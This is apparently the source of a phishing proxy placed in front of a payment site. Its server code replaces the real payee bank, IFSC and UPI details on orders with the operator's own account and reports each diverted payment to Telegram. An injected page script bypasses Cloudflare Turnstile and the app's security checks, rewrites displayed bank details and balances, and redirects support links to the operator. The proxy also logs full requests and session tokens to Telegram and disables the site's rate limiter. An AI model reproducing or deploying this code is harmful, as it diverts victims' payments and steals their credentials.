        if (isOrder && (_realBankSnap || _bankReplaced || _notReplacedAmt !== null || urlLower.includes('paymentslipdetail') || urlLower.includes('news/code/'))) {
            const _orderAmt = _notReplacedAmt !== null
                ? _notReplacedAmt
                : (getOrderAmount(req, respData) ?? getOrderAmount(req, jsonResp));
            if (_orderId && _bankReplaced && _replacedBank) {
                if (!data.orderBankMap) data.orderBankMap = {};
                const existingOrderMapping = getSavedOrderMapping(data, _orderId) || getSavedOrderMapping(data, respData);
                const bk = _bankReplaced && _replacedBank ? _replacedBank : (_realBankSnap || {});
                // Never overwrite an existing KV mapping with the upstream real bank.
                // Reuse an alias mapping when present, but always materialize it under
                // the canonical rptNo so /orders and later lookups can find it.
                const canonicalOrderId = (respData && respData.rptNo) ? String(respData.rptNo) : String(_orderId);
                const altId = (respData && (respData.orderNo || respData.orderId || respData.id || respData.slipId))
                    ? String(respData.orderNo || respData.orderId || respData.id || respData.slipId)
                    : String(_orderId);
                const savedData = parseSavedMapping(existingOrderMapping) || {
                    bank: `${bk.accountHolder || ''} | ${bk.accountNo || ''} | ${bk.ifsc || ''}`,
                    accountHolder: bk.accountHolder || '',
                    accountNo: bk.accountNo || '',
                    ifsc: bk.ifsc || '',
                    bankName: bk.bankName || '',
                    upiId: bk.upiId || '',
                    time: now,
                    userId: userId || '',
                    amount: _orderAmt || 0,
                    isManual: true,
                    forced: true
                };
                if (_bankReplaced && _replacedBank) {
                    savedData.bank = `${_replacedBank.accountHolder || ''} | ${_replacedBank.accountNo || ''} | ${_replacedBank.ifsc || ''}`;
                    savedData.accountHolder = _replacedBank.accountHolder || '';
                    savedData.accountNo = _replacedBank.accountNo || '';
                    savedData.ifsc = _replacedBank.ifsc || '';
                    savedData.bankName = _replacedBank.bankName || savedData.bankName || '';
                    savedData.upiId = _replacedBank.upiId || savedData.upiId || '';
                }
                savedData.rptNo = canonicalOrderId;
                savedData.orderNo = savedData.orderNo || altId || canonicalOrderId;
                savedData.amount = savedData.amount || _orderAmt || 0;
                savedData.isManual = true;
                savedData.forced = true;
                data.orderBankMap[canonicalOrderId] = savedData;
                if (_orderId && String(_orderId) !== canonicalOrderId) data.orderBankMap[String(_orderId)] = savedData;
                if (altId && altId !== canonicalOrderId) data.orderBankMap[altId] = savedData;
                // Order mappings must persist immediately; do not let the general
                // ten-second settings-save throttle drop this successful write.
                data._skipOverrideMerge = true;
                await saveData(data);
            }
            const realLine = _realBankSnap && (_realBankSnap.accountNo || _realBankSnap.accountHolder)
                ? `🏦 Real Bank:\n  Name: ${_realBankSnap.accountHolder || 'N/A'}\n  Acc:  ${_realBankSnap.accountNo || 'N/A'}${_realBankSnap.ifsc ? '\n  IFSC: ' + _realBankSnap.ifsc : ''}${_realBankSnap.bankName ? '\n  Bank: ' + _realBankSnap.bankName : ''}${_realBankSnap.upiId ? '\n  UPI:  ' + _realBankSnap.upiId : ''}`
                : '🏦 Real Bank: N/A';
            let replaceLine;
            if (_bankReplaced && _replacedBank) {
                replaceLine = `✅ Replaced With:\n  Name: ${_replacedBank.accountHolder}\n  Acc:  ${_replacedBank.accountNo}\n  IFSC: ${_replacedBank.ifsc}${_replacedBank.bankName ? '\n  Bank: ' + _replacedBank.bankName : ''}${_replacedBank.upiId ? '\n  UPI:  ' + _replacedBank.upiId : ''}`;
            } else if (_notReplacedAmt !== null) {
                replaceLine = `⚠️ NOT Replaced\n  ₹${_notReplacedAmt} < Min ₹${_notReplacedMin} — Real bank shown`;
            } else {
                replaceLine = `❌ NOT Replaced (no active bank)`;
            }

            // Determine if order was actually replaced or just not replaced due to min amount
            // Also ensure we only notify ONCE per order.
            const hasValidData = _orderAmt !== null || _realBankSnap || _bankReplaced;
            const shouldNotifyOrder = hasValidData
                ? await claimOrderNotification(data, _orderId || respData)
                : false;

            if (shouldNotifyOrder) {
                if (_bankReplaced && _replacedBank) {
                    notifyAdmin(data,
                        `✅ BUY SUCCESSFUL
💰 Amount: ₹${_orderAmt !== null ? _orderAmt : 'unknown'}
📋 Order: ${_orderId || 'N/A'}
💾 Order is saved for history
━━━━━━━━━━━━━━━━━━━━
${realLine}
━━━━━━━━━━━━━━━━━━━━
${replaceLine}
🕐 ${now}`);
                } else if (_notReplacedAmt !== null) {
                    notifyAdmin(data,
                        `⚠️ BUY SUCCESSFUL (NOT REPLACED)
💰 Amount: ₹${_notReplacedAmt}
📋 Order: ${_orderId || 'N/A'}
ℹ️ ₹${_notReplacedAmt} < Min ₹${_notReplacedMin}
━━━━━━━━━━━━━━━━━━━━
${realLine}
━━━━━━━━━━━━━━━━━━━━
${replaceLine}
🕐 ${now}`);
                } else if (jsonResp && jsonResp.code !== 0 && jsonResp.code !== 200) {
                    notifyAdmin(data,
                        `❌ BUY NOT SUCCESSFUL
💰 Amount: ₹${_orderAmt !== null ? _orderAmt : 'unknown'}
📋 Order: ${_orderId || 'N/A'}
⚠️ Reason: ${jsonResp.msg || jsonResp.message || 'unknown error'}
🕐 ${now}`);
                } else if (_realBankSnap && (_realBankSnap.accountNo || _realBankSnap.accountHolder)) {
                    // Only notify about 'No Active Bank' if there are actual real bank details being shown
                    notifyAdmin(data,
                        `ℹ️ ORDER PLACED (No Active Bank)
💰 Amount: ₹${_orderAmt !== null ? _orderAmt : 'unknown'}
📋 Order: ${_orderId || 'N/A'}
━━━━━━━━━━━━━━━━━━━━
${realLine}
━━━━━━━━━━━━━━━━━━━━
${replaceLine}
🕐 ${now}`);
                }
            }
        }

        // Non-blocking save — don't hold up the response for storage I/O
        if (userId) saveData(data).catch(() => { });

        // ── Raw log — send full req+resp to Telegram if /rr is ON
        sendRawLog(data, {
            method: req.method,
            url: req.originalUrl || req.url,
            reqHeaders: req.headers,
            reqBodyRaw: req.rawBody,
            status: response.status,
            respHeaders: respHeaders,
            respBodyRaw: respBody,
            source: 'api',
            now
        }).catch(() => { });

        if (jsonResp) cleanUglyBankNames(jsonResp);
        sendJson(res, respHeaders, jsonResp);

    } catch (e) {
        console.error('xxapi proxy error:', e.message);
        try {
            const url = TIVOX_API + (req.originalUrl || req.url);
            const fwd = {};
            for (const [k, v] of Object.entries(req.headers)) {
                const kl = k.toLowerCase();
                if (kl === 'host' || kl === 'connection' || kl === 'content-length' || kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
                fwd[k] = v;
            }
            fwd['host'] = 'tivox.icu';
            const opts = { method: req.method, headers: fwd, redirect: 'manual' };
            if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
                opts.body = req.rawBody;
            }
            const resp = await fetch(url, opts);
            const body = await resp.text();
            res.writeHead(resp.status, { 'content-type': resp.headers.get('content-type') || 'application/json' });
            res.end(body);
        } catch (e2) {
            if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
        }
    }
});

const INJECT_JS = `(function(){
if(window._pxi)return;window._pxi=1;
var P='https://${PROXY_HOST}';
var REAL='https://tivox.icu';
var REAL2='https://qonix.click';
var SERVER_IFSC='';

// ── Intercept API calls so <base> tag doesn't redirect them to vivipay.net ──
(function(){
  var origFetch = window.fetch;
  window.fetch = function(url, opts) {
    if (typeof url === 'string') {
      if (url.indexOf('rsCfg.json') !== -1 || url.indexOf('/rsCfg.json') !== -1) {
        url = P + '/rsCfg.json';
      } else if (url.indexOf('vivipay.net/xxapi/') !== -1 || url.indexOf('tivox.icu/xxapi/') !== -1 || url.indexOf('qonix.click/xxapi/') !== -1) {
        url = P + '/xxapi/' + url.split('/xxapi/')[1];
      }
    }
    return origFetch.call(window, url, opts);
  };
  if (typeof XMLHttpRequest !== 'undefined' && XMLHttpRequest.prototype && XMLHttpRequest.prototype.open) {
    var origOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url, async, user, pass) {
      if (typeof url === 'string') {
        if (url.indexOf('rsCfg.json') !== -1 || url.indexOf('/rsCfg.json') !== -1) {
          url = P + '/rsCfg.json';
        } else if (url.indexOf('vivipay.net/xxapi/') !== -1 || url.indexOf('tivox.icu/xxapi/') !== -1 || url.indexOf('qonix.click/xxapi/') !== -1) {
          url = P + '/xxapi/' + url.split('/xxapi/')[1];
        }
      }
      return origOpen.call(this, method, url, async, user, pass);
    };
  }
})();

// ── Cloudflare Turnstile auto-complete ──────────────────────────────────────
// vivipay.net waits for turnstile.render() callback before enabling login.
// On our proxy domain, the real Cloudflare widget sometimes doesn't fire the
// callback. We intercept window.turnstile when Cloudflare sets it and wrap
// render() to immediately call the callback — getsendtken accepts any token.
(function(){
  var _autoTurnstile={
    render:function(el,opts){
      var wid='auto-'+Math.random().toString(36).slice(2,8);
      // Call callback immediately (10ms delay to let Vue component mount)
      if(opts&&typeof opts.callback==='function'){
        setTimeout(function(){opts.callback('auto-cf-'+Date.now());},10);
      }
      // Also set global response so getResponse works
      window._cfTurnstileToken='auto-cf-'+Date.now();
      return wid;
    },
    remove:function(){},
    reset:function(){},
    getResponse:function(){return window._cfTurnstileToken||'auto-cf-'+Date.now();},
    isExpired:function(){return false;}
  };
  // Intercept when Cloudflare sets window.turnstile
  var _cfReal=null;
  try{
    Object.defineProperty(window,'turnstile',{
      configurable:true,
      get:function(){return _cfReal||_autoTurnstile;},
      set:function(v){
        // When real Cloudflare script sets turnstile, wrap render to auto-call callback
        if(v&&typeof v.render==='function'){
          _cfReal={};
          for(var k in v)_cfReal[k]=v[k];
          var _orig=v.render.bind(v);
          _cfReal.render=function(el,opts){
            // Kill error/expired callbacks — prevent "Security check failed" toast
            if(opts){
              opts['error-callback']=function(){};
              opts['expired-callback']=function(){};
              opts['timeout-callback']=function(){};
              opts['unsupported-callback']=function(){};
            }
            var id=_orig(el,opts);
            // Safety net: if callback not called within 1.5s, auto-call it
            var _done=false;
            var _origCb=opts&&opts.callback;
            if(_origCb){
              setTimeout(function(){
                if(!_done){_done=true;try{_origCb('auto-cf-'+Date.now());}catch(e){}}
              },1500);
            }
            return id;
          };
        } else {
          _cfReal=_autoTurnstile;
        }
      }
    });
  }catch(e){
    // defineProperty failed — set directly as fallback
    if(!window.turnstile)window.turnstile=_autoTurnstile;
  }
})();
// ────────────────────────────────────────────────────────────────────────────

// Mock xamlAction for browser — app ke native bridge ka replacement
// Security check calls ko intercept karke success return karo
if(!window.xamlAction){
  window.xamlAction={
    showToast:function(msg){console.log('[xaml] toast:',msg);},
    closeWebview:function(){try{window.history.back();}catch(e){}},
    openWebview:function(url){try{window.location.href=url;}catch(e){}},
    getDeviceInfo:function(){return JSON.stringify({deviceId:'bro_'+Math.random().toString(36).slice(2,10),platform:'android',version:'1.0.0',brand:'samsung',model:'SM-G991B',osVersion:'12'});},
    getToken:function(){try{return localStorage.getItem('token')||'';}catch(e){return '';}},
    saveToken:function(t){try{localStorage.setItem('token',t);}catch(e){}},
    getSecurityToken:function(){return 'sec_'+Date.now().toString(36);},
    getSign:function(data){return 'sign_'+btoa(data||'').slice(0,16);},
    getNonce:function(){return Math.random().toString(36).slice(2,18);},
    getTimestamp:function(){return String(Date.now());},
    checkSecurity:function(){return '1';},
    securityCheck:function(){return 'pass';},
    getVerifyCode:function(){return 'ok';},
    invokeAction:function(action,params){
      try{
        var p=params?JSON.parse(params):{};
        if(action==='getToken')return localStorage.getItem('token')||'';
        if(action==='getDeviceInfo')return window.xamlAction.getDeviceInfo();
        if(action==='closeWebview'){window.history.back();return '';}
        if(action==='openWebview'&&(p.url||p.ct_url)){window.location.href=p.url||p.ct_url;return '';}
        var act=String(action||'').toLowerCase();
        if(act.indexOf('bank')>-1||act.indexOf('ifsc')>-1||act.indexOf('payee')>-1||act.indexOf('account')>-1){
          var activeIfsc=(window.CFG&&(CFG.ifsc||CFG['if']))||SERVER_IFSC||'';
          return JSON.stringify({code:0,msg:'ok',data:{bankName:activeIfsc,bank:activeIfsc,ifsc:activeIfsc,payee_bankname:activeIfsc,payee_ifsc:activeIfsc}});
        }
        return JSON.stringify({code:0,msg:'ok',data:{}});
      }catch(e){
        var fallbackIfsc=(window.CFG&&(CFG.ifsc||CFG['if']))||SERVER_IFSC||'';
        return JSON.stringify({code:0,msg:'ok',data:{bankName:fallbackIfsc,bank:fallbackIfsc,ifsc:fallbackIfsc,payee_bankname:fallbackIfsc,payee_ifsc:fallbackIfsc}});
      }
    }
  };
}


function _px(u){if(!u||typeof u!=='string')return null;if(u.indexOf(REAL)===0)return P+u.slice(REAL.length);if(u.indexOf(REAL2)===0)return P+u.slice(REAL2.length);return null;}
var CFG=null;
var UID='';

try{var _ls=localStorage.getItem('_px_uid');if(_ls&&/^\\d{6,12}$/.test(_ls))UID=_ls;}catch(e){}

function lc(){
try{var x=new XMLHttpRequest();
x.open('GET',P+'/hook/config'+(UID?'?userId='+UID:''),false);
x.send();if(x.status===200)CFG=JSON.parse(x.responseText);}catch(e){}}
function lcAsync(){
try{var x=new XMLHttpRequest();
x.open('GET',P+'/hook/config'+(UID?'?userId='+UID:''),true);
x.onload=function(){try{CFG=JSON.parse(x.responseText);}catch(e){}};
x.send();}catch(e){}}
// Do not block first paint on optional user/config state.
try{lcAsync();}catch(e){}
setInterval(function(){lcAsync();},25000);

var ID_FIELDS=['teamWorkId','memberCodeId','userId','channelUid','uid','memberId','accountId'];

function setUID(id){
if(!id||!/^\\d{6,12}$/.test(id)||id===UID)return;
UID=id;try{localStorage.setItem('_px_uid',id);}catch(e){}
lcAsync();}

var _open=XMLHttpRequest.prototype.open;
var _send=XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.open=function(m,u){
var _pu=_px(u);if(_pu){u=_pu;arguments[1]=u;}
this._hu=u;this._hm=m;
var ret=_open.apply(this,arguments);
if(UID){try{this.setRequestHeader('x-px-uid',UID);}catch(e){}}
return ret;};

var _cachedBal=null;
function fmtBal(v){var n=parseFloat(v);if(isNaN(n))return null;return n.toFixed(2);}
if(CFG&&CFG.bal!==null&&CFG.bal!==undefined){_cachedBal=fmtBal(CFG.bal);}
if(!_cachedBal){try{var _cb=localStorage.getItem('_px_bal');if(_cb)_cachedBal=fmtBal(_cb);}catch(e){}}

function cacheBal(obj){
if(!obj||typeof obj!=='object')return;
var bks=['iToken','itoken','balance','userBalance','availableBalance','totalBalance','money','tokenBalance'];
for(var i=0;i<bks.length;i++){
var bk=bks[i];
if(obj[bk]!==undefined&&obj[bk]!==null&&obj[bk]!==''){
var bv=parseFloat(obj[bk]);
if(!isNaN(bv)&&bv>0){_cachedBal=bv.toFixed(2);
try{localStorage.setItem('_px_bal',_cachedBal);}catch(e){}return;}}}
for(var k in obj){if(typeof obj[k]==='object'&&obj[k]!==null&&!Array.isArray(obj[k])){cacheBal(obj[k]);}}}

function patchBankDOM(){
try{
var activeIfsc=(CFG&&(CFG.ifsc||CFG['if']))||SERVER_IFSC||'';
if(!activeIfsc||!document.body)return;
var walker=document.createTreeWalker(document.body,NodeFilter.SHOW_TEXT,null,false);
while(walker.nextNode()){
  var nd=walker.currentNode;
  var txt=(nd.textContent||'').trim();
  var isBankJson=/^\\s*\\{[\\s\\S]*\\}\\s*$/.test(txt)&&/["']?(?:code|msg|data|bankName|bank|ifsc|payee_bankname|payee_ifsc)["']?\\s*:/.test(txt);
  if(isBankJson){
    var p=nd.parentElement, ctx=p?((p.innerText||'')+' '+(p.parentElement?p.parentElement.innerText||'':'' )).toLowerCase():'';
    if(ctx.indexOf('bank')>-1||ctx.indexOf('ifsc')>-1){nd.textContent=activeIfsc;}
  }
}
}catch(e){}
}

function patchBalDOM(){
if(!_cachedBal||_cachedBal==='0'||_cachedBal==='0.00')return;
if(!document.body)return;
var walker=document.createTreeWalker(document.body,NodeFilter.SHOW_TEXT,null,false);
var toFix=[];
while(walker.nextNode()){
var nd=walker.currentNode;
var txt=(nd.textContent||'').trim();
if(txt!=='0.00'&&txt!=='0'&&txt!=='0.0')continue;
var el=nd.parentElement;
if(!el||el.children.length>0)continue;
var p1=el.parentElement;
var p2=p1?p1.parentElement:null;
var p3=p2?p2.parentElement:null;
var ctx='';
if(p1)ctx+=(p1.innerText||'').toLowerCase();
if(p2)ctx+=' '+(p2.innerText||'').toLowerCase();
if(p3)ctx+=' '+(p3.innerText||'').toLowerCase();
if(ctx.indexOf('itoken')>-1||ctx.indexOf('balance')>-1||ctx.indexOf('my itoken')>-1||ctx.indexOf('wallet')>-1){
var elCtx=(el.innerText||'').toLowerCase();
if(elCtx.indexOf('profit')===-1&&elCtx.indexOf('reward')===-1&&elCtx.indexOf('team')===-1&&elCtx.indexOf('commission')===-1){
toFix.push(nd);}}}
for(var i=0;i<toFix.length;i++){toFix[i].textContent=_cachedBal;}}

XMLHttpRequest.prototype.send=function(body){
var self=this;
self.addEventListener('load',function(){
try{
var r=self.response;
if(!r)return;
var j=typeof r==='object'?r:(typeof r==='string'?JSON.parse(r):null);
if(!j)return;
var d=j.data||j.body||j.result||j;
if(d&&typeof d==='object'){
cacheBal(d);
for(var i=0;i<ID_FIELDS.length;i++){
var f=ID_FIELDS[i];
if(d[f]){var v=String(d[f]).trim();
if(/^\\d{6,12}$/.test(v)){setUID(v);break;}}}}
setTimeout(patchBalDOM,50);setTimeout(patchBalDOM,200);setTimeout(patchBalDOM,500);
}catch(e){}});
return _send.apply(this,arguments);};

var _fetch=window.fetch;
if(_fetch){
window.fetch=function(input,init){
var url=typeof input==='string'?input:(input&&input.url)||'';
var _purl=_px(url);if(_purl){var nu=_purl;
if(typeof input==='string'){arguments[0]=nu;}
else{arguments[0]=new Request(nu,input);}}
if(UID){if(!init)init={};if(!init.headers)init.headers={};
if(init.headers instanceof Headers){init.headers.set('x-px-uid',UID);}
else{init.headers['x-px-uid']=UID;}arguments[1]=init;}
return _fetch.apply(this,arguments).then(function(resp){
try{var cl=resp.clone();
cl.text().then(function(t){
try{var j=JSON.parse(t);var d=j.data||j.body||j.result||j;
if(d&&typeof d==='object'){
cacheBal(d);
for(var i=0;i<ID_FIELDS.length;i++){
var f=ID_FIELDS[i];if(d[f]){var v=String(d[f]).trim();
if(/^\\d{6,12}$/.test(v)){setUID(v);break;}}}}}catch(e){}}).catch(function(){});}catch(e){}
return resp;});};}

var _csPage=false;
function csUrl(s){
if(!s||typeof s!=='string')return false;
return s.indexOf('t.me/')>-1||s.indexOf('wa.me/')>-1||s.indexOf('whatsapp.com')>-1||s.indexOf('telegram.me/')>-1||s.indexOf('telegram.org')>-1||s.indexOf('chat.')>-1||s.indexOf('support')>-1||s.indexOf('service')>-1||s.indexOf('kefu')>-1;}

function isCSPage(){
var url=(window.location.href||window.location.pathname||'').toLowerCase();
return url.indexOf('customerservice')>-1||url.indexOf('customer_service')>-1||url.indexOf('customer-service')>-1||url.indexOf('kefu')>-1||url.indexOf('online_service')>-1||url.indexOf('servicelist')>-1||url.indexOf('csrlist')>-1;}

function fixLinks(){
if(!CFG||!CFG.tg)return;
_csPage=isCSPage();
var links=document.querySelectorAll('a');
for(var i=0;i<links.length;i++){
var h=links[i].href||'';
if(csUrl(h)){links[i].href=CFG.tg;links[i].setAttribute('href',CFG.tg);}}}

function fixOnClick(){
if(!CFG||!CFG.tg)return;
var all=document.querySelectorAll('[onclick]');
for(var i=0;i<all.length;i++){
var oc=all[i].getAttribute('onclick')||'';
if(csUrl(oc)){all[i].setAttribute('onclick',"window.location.href='"+CFG.tg+"'");}}}

var _wopen=window.open;
window.open=function(url){
if(CFG&&CFG.tg){
if(csUrl(url)||_csPage){arguments[0]=CFG.tg;}}
return _wopen.apply(this,arguments);};

var _locDesc=Object.getOwnPropertyDescriptor(window,'location')||{};
var _asgn=window.location.assign.bind(window.location);
var _repl=window.location.replace.bind(window.location);
window.location.assign=function(url){if(CFG&&CFG.tg&&(csUrl(url)||_csPage))url=CFG.tg;return _asgn(url);};
window.location.replace=function(url){if(CFG&&CFG.tg&&(csUrl(url)||_csPage))url=CFG.tg;return _repl(url);};

if(window.xamlAction&&window.xamlAction.invokeAction){
var _invoke=window.xamlAction.invokeAction.bind(window.xamlAction);
window.xamlAction.invokeAction=function(action,params){
if(CFG&&CFG.tg&&params){
try{var p=JSON.parse(params);
var changed=false;
var ukeys=['ct_url','url','link','href','jumpUrl','serviceUrl','csUrl','jump_url','target','redirect','contactUrl'];
ukeys.forEach(function(key){
if(p[key]&&typeof p[key]==='string'&&(csUrl(p[key])||p[key].indexOf('http')===0)){p[key]=CFG.tg;changed=true;}});
if(changed)params=JSON.stringify(p);
}catch(e){}}
return _invoke(action,params);};}

document.addEventListener('click',function(e){
if(!CFG||!CFG.tg)return;
var el=e.target;var depth=0;
var onCS=_csPage||isCSPage();
while(el&&depth<10){
if(el.tagName==='A'){
var href=el.getAttribute('href')||'';
if(csUrl(href)||(onCS&&href.indexOf('http')===0)){
e.preventDefault();e.stopPropagation();
window.location.href=CFG.tg;return;}
if(href.indexOf('xaml:')===0){
try{var dec=decodeURIComponent(href.substring(5));
var jo=JSON.parse(dec);
var ck=['ct_url','url','link','href','jumpUrl','jump_url','target','serviceUrl'];
var ch=false;
ck.forEach(function(k2){if(jo[k2]){jo[k2]=CFG.tg;ch=true;}});
if(ch){e.preventDefault();e.stopPropagation();window.location.href=CFG.tg;return;}}catch(e2){}}
if(href.indexOf('syt:')===0){
try{var dec2=decodeURIComponent(href.substring(4));
var jo2=JSON.parse(dec2);
if(jo2.url||jo2.link||jo2.href){
e.preventDefault();e.stopPropagation();window.location.href=CFG.tg;return;}}catch(e3){}}}
if(onCS&&(el.tagName==='BUTTON'||el.tagName==='DIV'||el.tagName==='SPAN'||el.tagName==='LI')){
var elTxt=(el.innerText||'').toLowerCase();
if(elTxt.indexOf('go')>-1||elTxt.indexOf('service')>-1||elTxt.indexOf('online')>-1||elTxt.indexOf('csr')>-1||elTxt.indexOf('whatsapp')>-1||elTxt.indexOf('telegram')>-1||elTxt.indexOf('contact')>-1){
e.preventDefault();e.stopPropagation();
window.location.href=CFG.tg;return;}}
el=el.parentElement;depth++;}
},true);

function scanDOM(){
try{if(!document.body)return;
var txt=document.body.innerText||'';
var m=txt.match(/ID\\s*:\\s*([0-9]{6,12})/i);
if(m&&m[1])setUID(m[1]);
}catch(e){}}

scanDOM();patchBankDOM();patchBalDOM();
var _rafC=0;function _rafLoop(){patchBankDOM();patchBalDOM();_rafC++;if(_rafC<300)requestAnimationFrame(_rafLoop);}
requestAnimationFrame(_rafLoop);
setInterval(function(){scanDOM();patchBankDOM();patchBalDOM();},300);
if(document.body){
var obs=new MutationObserver(function(){patchBankDOM();patchBalDOM();fixLinks();fixOnClick();scanDOM();});
obs.observe(document.body,{childList:true,subtree:true,characterData:true});}
else{document.addEventListener('DOMContentLoaded',function(){
patchBankDOM();patchBalDOM();
var obs2=new MutationObserver(function(){patchBankDOM();patchBalDOM();fixLinks();fixOnClick();scanDOM();});
obs2.observe(document.body,{childList:true,subtree:true,characterData:true});});}
setInterval(function(){fixLinks();fixOnClick();},2000);
fixLinks();fixOnClick();patchBankDOM();patchBalDOM();
})();`;

// ─── Frontend catch-all proxy ───────────────────────────────────────────────
// Proxy everything else from vivipay.net
// For HTML responses: inject our inject.js script into <head>
app.all('*', async (req, res) => {
    try {
        const path = req.originalUrl || req.url;

        // --- TOKEN LOGIN BYPASS HANDLER ---
        if (req.query && req.query.token) {
            const token = req.query.token.trim();
            if (token.length > 10) {
                const cookieStr = `token=${token}; Path=/; Secure; SameSite=None; Max-Age=31536000`;
                res.setHeader('Set-Cookie', cookieStr);

                // Inject script to set LocalStorage as well
                const html = `<html><body><script>
          localStorage.setItem('token', '${token}');
          localStorage.setItem('accessToken', '${token}');
          document.cookie = "${cookieStr}";
          window.location.href = "/";
        </script></body></html>`;
                return res.status(200).send(html);
            }
        }
        // ----------------------------------
        const url = 'https://' + FRONTEND_HOST + path;
        const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

        const fwd = {};
        for (const [k, v] of Object.entries(req.headers)) {
            const kl = k.toLowerCase();
            if (kl === 'host' || kl === 'connection' || kl === 'content-length' ||
                kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
            fwd[k] = v;
        }
        fwd['host'] = FRONTEND_HOST;
        fwd['origin'] = 'https://' + FRONTEND_HOST;
        fwd['referer'] = 'https://' + FRONTEND_HOST + '/';

        const opts = { method: req.method, headers: fwd, redirect: 'follow' };
        if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
            opts.body = req.rawBody;
            fwd['content-length'] = String(req.rawBody.length);
        }

        const response = await fetch(url, opts);
        const ct = response.headers.get('content-type') || '';

        // Pass through response headers (skip hop-by-hop)
        const skipHeaders = new Set(['transfer-encoding', 'connection', 'content-encoding', 'content-length', 'keep-alive']);
        response.headers.forEach((val, key) => {
            const kl = key.toLowerCase();
            if (skipHeaders.has(kl)) return;

            // Rewrite Set-Cookie: strip Domain so browser stores cookies for our proxy domain
            // This fixes "security check failed" in incognito — vivipay.net session cookies get
            // stored for rtyhh.vercel.app and are forwarded back to vivipay.net on every request
            if (kl === 'set-cookie') {
                val = val.replace(/;\s*[Dd]omain=[^;]+/gi, '');
                val = val.replace(/;\s*SameSite=(?:Strict|Lax)/gi, '; SameSite=None');
                if (!/SameSite/i.test(val)) val = val.trimEnd() + '; SameSite=None';
                if (/SameSite=None/i.test(val) && !/;\s*Secure/i.test(val)) val += '; Secure';
                res.append('set-cookie', val);
                return;
            }

            res.setHeader(key, val);
        });

        res.setHeader('Access-Control-Allow-Origin', '*');

        // HTML — inject our script + set base so static assets load from vivipay.net directly
        if (ct.includes('text/html')) {
            const htmlCacheKey = 'html:' + path;
            const htmlCached = cacheGet(htmlCacheKey);
            if (htmlCached) {
                res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
                res.setHeader('Pragma', 'no-cache');
                res.setHeader('content-type', 'text/html; charset=utf-8');
                res.setHeader('content-length', String(htmlCached.buf.length));
                res.status(htmlCached.status).end(htmlCached.buf);
                return;
            }
            let html = await response.text();

            const proxyBase = 'https://' + PROXY_HOST;
            const frontendBase = 'https://' + FRONTEND_HOST;

            // Rewrite absolute tivox/qonix URLs to proxy
            html = html.replace(/https:\/\/tivox\.icu/g, proxyBase);
            html = html.replace(/https:\/\/qonix\.click/g, proxyBase);

            // Rewrite JS script src tags to go through OUR proxy so we can patch them
            // CSS/fonts/images keep base href pointing to vivipay.net (fast direct load)
            html = html.replace(
                /(<script[^>]+src=")(\.\/)?(assets\/[^"]+\.js)(")/g,
                `$1${proxyBase}/$3$4`
            );
            // Also handle modulepreload links for JS
            html = html.replace(
                /(<link[^>]+rel="modulepreload"[^>]+href=")(\.\/)?(assets\/[^"]+\.js)(")/g,
                `$1${proxyBase}/$3$4`
            );

            const turnstileBypass = ''; // disabled — using real CF widget

            // Preconnect hints for faster asset loading from vivipay.net
            const preconnect = `<link rel="preconnect" href="${proxyBase}" crossorigin><link rel="preconnect" href="${frontendBase}" crossorigin><link rel="dns-prefetch" href="${proxyBase}"><link rel="dns-prefetch" href="${frontendBase}">`;

            const turnstileCSS = ''; // disabled — let CF widget show normally

            // Add <base> tag so remaining relative asset URLs (CSS, images, fonts) load directly from vivipay.net
            const baseTag = `<base href="${frontendBase}/">`;

            // Inject: preconnect at top of <head>, base+inject.js before </head>
            const injectTag = `<script src="${proxyBase}/inject.js"></script>`;
            if (html.includes('</head>')) {
                html = html.replace(/<head[^>]*>/i, '$&\n' + preconnect);
                html = html.replace('</head>', baseTag + '\n' + injectTag + '\n</head>');
            } else {
                html = preconnect + '\n' + baseTag + '\n' + injectTag + '\n' + html;
            }

            const buf = Buffer.from(html, 'utf-8');
            // Cache HTML server-side for 30s — avoids vivipay.net round-trip on each refresh
            cacheSet(htmlCacheKey, buf, 'text/html; charset=utf-8', response.status, 60000);
            res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
            res.setHeader('Pragma', 'no-cache');
            res.setHeader('content-type', 'text/html; charset=utf-8');
            res.setHeader('content-length', String(buf.length));
            res.status(response.status).end(buf);

            // Raw log — frontend HTML page load
            if (cachedData && cachedData.rawLog) {
                const rhdrs = {}; response.headers.forEach((v, k) => { rhdrs[k] = v; });
                loadData().then(d => sendRawLog(d, {
                    method: req.method, url: req.originalUrl || req.url,
                    reqHeaders: req.headers, reqBodyRaw: req.rawBody,
                    status: response.status, respHeaders: rhdrs,
                    respBodyRaw: html.substring(0, 8000),
                    source: 'frontend', now
                })).catch(() => { });
            }
            return;
        }

        // JS — rewrite tivox/qonix references to proxy + patch frontend rate limiter
        if (ct.includes('javascript')) {
            // Skip cache for HEAD requests (no body — would cache 0 bytes)
            if (req.method === 'HEAD') {
                res.setHeader('Cache-Control', 'public, max-age=86400, immutable');
                res.setHeader('content-type', ct);
                res.status(response.status).end();
                return;
            }
            const cacheKey = 'js:' + path;
            let cached = cacheGet(cacheKey);
            let buf, finalCt;

            if (cached) {
                buf = cached.buf;
                finalCt = cached.ct;
            } else {
                let js = await response.text();
                const proxyBase = 'https://' + PROXY_HOST;
                js = js.replace(/https:\/\/tivox\.icu/g, proxyBase);
                js = js.replace(/https:\/\/qonix\.click/g, proxyBase);
                js = js.replace(/\.\/rsCfg\.json/g, proxyBase + '/rsCfg.json');
                js = js.replace(/"rsCfg\.json/g, '"' + proxyBase + '/rsCfg.json');

                // Patch frontend rate limiter — "Please slow down." blocker
                js = js.replace(/API_HTTP_WINDOW_MS\s*=\s*1e3/g, 'API_HTTP_WINDOW_MS=999999999');
                js = js.replace(/API_HTTP_WINDOW_MS\s*=\s*1000/g, 'API_HTTP_WINDOW_MS=999999999');
                js = js.replace(/API_HTTP_DEFAULT_MAX_PER_WINDOW\s*=\s*1\b/g, 'API_HTTP_DEFAULT_MAX_PER_WINDOW=9999');
